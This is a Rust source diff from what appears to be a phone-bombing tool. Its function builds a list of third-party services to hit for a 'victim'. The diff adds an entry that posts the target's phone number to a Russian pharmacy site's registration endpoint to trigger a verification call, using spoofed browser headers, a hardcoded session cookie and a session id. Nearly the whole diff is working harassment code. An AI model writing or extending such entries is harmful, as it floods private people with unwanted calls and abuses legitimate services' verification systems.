@@ -1,9 +1,10 @@
-use crate::phone::FormatterTypes::Without7;
+use crate::phone::FormatterTypes::{WithPlusBracketsHyphen, Without7};
 use crate::phone::{Country, FormatterTypes::WithPlus, Phone};
 use reqwest::header::HeaderMap;
 use reqwest::Method;
 use serde_json::json;
 
+#[allow(dead_code)]
 #[derive(Debug, Clone)]
 pub struct Service {
     pub name: String,
@@ -616,6 +617,86 @@ pub async fn construct_call_services_list(victim: Victim) -> Vec<Service> {
                 service.body = json!({
                     "phone": phone.phone,
                     "source": "web_auth_page"
+                });
+
+                services.push(service);
+            }
+            // NFApteka_call
+            {
+                let mut service = Service {
+                    name: "NFApteka_call".to_string(),
+                    service_type: ServiceType::Call,
+                    method: Method::POST,
+                    url: "https://nfapteka.ru/registration/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::Form,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"nfapteka.ru"#.parse().unwrap());
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Content-Type",
+                    r#"application/x-www-form-urlencoded; charset=UTF-8"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Origin", r#"https://nfapteka.ru"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert(
+                    "Referer",
+                    r#"https://nfapteka.ru/registration/"#.parse().unwrap(),
+                );
+                service.headers.insert("Cookie", r#"BITRIX_SMQ_PK=tambov; PHPSESSID=i7BzukIacK1b4Qzf55bcDoFQxGJ1fUWP; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A3%2C%22EXPIRE%22%3A1735592340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BITRIX_SMQ_SET_CITY=1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"nfapteka.ru"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlusBracketsHyphen);
+                service.body = json!({
+                    "component": "bxmaker.authuserphone.login",
+                    "sessid": "5209f4d0113705c8f663c2abbbe76e00",
+                    "method": "callCode",
+                    "phone": phone.phone,
+                    "registration": "Y"
                 });
 
                 services.push(service);
